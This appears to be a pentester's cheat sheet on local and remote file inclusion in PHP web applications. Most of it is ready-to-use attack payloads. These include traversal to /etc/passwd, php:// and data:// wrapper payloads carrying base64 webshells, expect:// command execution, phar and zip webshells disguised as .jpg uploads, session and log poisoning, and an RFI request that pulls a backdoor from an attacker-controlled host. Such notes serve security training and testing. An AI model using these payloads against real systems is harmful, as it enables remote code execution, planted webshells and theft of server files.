 The File Inclusion vulnerability allows an attacker to include a file into the application's running code. The objective is to perform a remote code execution (RCE) or read files.
* Local File Inclusion (LFI): Inclusion of files or code that are locally present on a server. 
	* Example: `http://<ip>:<port>/<page>?<parameter>=../../../../../../etc/passwd`
	* Can use [[Directory Traversal]] techniques with LFI to expand search to more directories.
	* LFI fuzzing wordlist [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) can be used with fuzzing tools like fffuf.
	* Automated LFI tools: [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy)
	- WAF, input sanitization bypass:
		- Use extra slashes/dots or encoded payloads in [[Directory Traversal]]
		- Try including keywords incase inputs containing only certain keywords are allowed by the application.
		- Try file without its extension.
	- PHP config file locations to read with file inclusion techniques:
		- `/etc/php/<php version number>/apache2/php.ini` for Apache2
		- `/etc/php/<php version number>/fpm/php.ini` for Nginx
	- PHP Wrappers: Similar to http or https protocol wrappers used in URL, there are other wrappers supported by PHP such as php:// and data:// to retrieve local files.
		- php:// wrapper:
			- `hxxp://host/index.php?page=php://filter/resource=admin.php` is the equivalent of hxxp://host/index.php?page=admin.php and also executes the code as in file inclusion.
			- `hxxp://host/index.php?page=php://filter/convert.base64-encode/resource=admin.php` prints the base 64 version of admin.php. Effectively this means admin.php can be viewed without executing it. Instead of performing file inclusion, it only performs directory traversal to view the file instead of executing it.
			- `curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=<command>'` upload base64 encoded php webshell and execute command.
			- `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=<command>"`*
				- Input wrapper in php using a post request to sent webshell in post data and command in "cmd=" variable on URL get request and execute commands. 
				- Can also put command in post request if needed.
				- allow_url_include setting needs to be enabled in php config file.
			- The wrapper's strength in attacking is to view the file without executing it which helps in looking at application logic.
			- Reference: https://www.php.net/manual/en/wrappers.php.php
		- data:// wrapper:
			- `hxxp://host/index.php?page=data://text/plain,<php%20echo%20system('ls');>"` converts the php which is in url encoded format into plain text before going into index.php as input.
			- `hxxp://host/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=<command>"`  takes the base64 text to plain text which translates it to `<?php echo system($_GET["cmd"]);?>` before going into page URL parameter.
			- The wrapper strength in attacking is to perform file inclusion to execute code instead of searching for a local file to include.
			- Note: the allow_url_include setting needs to be enabled in php config file for the data:// wrapper to work and it is not enabled in default php installation.
			- Reference: https://www.php.net/manual/en/wrappers.data.php
		- expect:// wrapper:
			- `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://<command>"` for command execution using expect wrapper.
			- allow_url_include setting needs to be enabled in php.
		- phar:// wrapper
			- Write the following into file shell.php: 
			  ```
			  <?php 
			  $phar = new Phar('shell.phar');
			  $phar->startBuffering();
			  $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
			  $phar->setStub('<?php __HALT_COMPILER(); ?>');
			  $phar->stopBuffering();
			  ```
			  * Compile the phar file: `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
			  * Upload phar file.
			  * Use phar:// wrapper to deserialize and include, execute web shell: `http://<SERVER_IP>:<PORT>/index.php?language=phar://<lfi path>/shell.jpg%2Fshell.txt&cmd=id`
		- zip:// wrapper
			- Create webshell and zip it as shell.php: `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`
			- Upload file.
			- Use zip:// wrapper to unzip and include, execute webshell: `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`
	- Can use File Upload attack into LFI into RCE.
	- LFI PHP session poisoning:
		- Get `PHPSESSID` cookie value from storage tab in inspector or burp.
		- Perform LFI to php session file: `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<php session value>`
		- Try manipulating any variables by interacting with web application and poison it by setting a value with a webshell.
		- Execute webshell by LFI on session file again: `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<php session value>`
	- LFI using Log Poisoning
		- Get web application's log file. Can use [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz it.
		- Inject php code in user agent header field of the HTTP request using burp: `User-Agent: <?php system($_GET['cmd']); ?>` 
			- or specify curl user agent: `-A '<?php system($_GET['cmd']); ?>'`
		- Use LFI to include the log file: `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`
		- Alternative files to include:
			- `/var/log/nginx/access.log`
			- `/proc/self/environ`
			- `/proc/self/fd/N` (where N is a PID usually between 0-50)
			- `/var/log/sshd.log`
			- `/var/log/mail`
			- `/var/log/vsftpd.log`
- Remote File Inclusion (RFI): Same as LFI instead of including local files on a web server, RFI includes files from an remote system via http or SMB
	- allow_url_include setting needs to be enabled in php.
	- Can make it into SSRF or RCE.
	- RCE using RFI:
		-  Create a web server using python server: "python3 -m http.server 80" on the attack machine.
		- Use a webshell php file for RFI payload found on kali on `/usr/share/webshells/php/simple-backdoor.php`
		- In the target web server make the following request: `hxxp://mountaindesserts.com/meteor/index.php?page=hxxp://<attack_machine_ip>/simple-backdoor.php&cmd=ls`
		- Can use ftp, smb protocol and host the file on an FTP server, smb server instead.
- Additional reference: https://book.hacktricks.xyz/pentesting-web/file-inclusion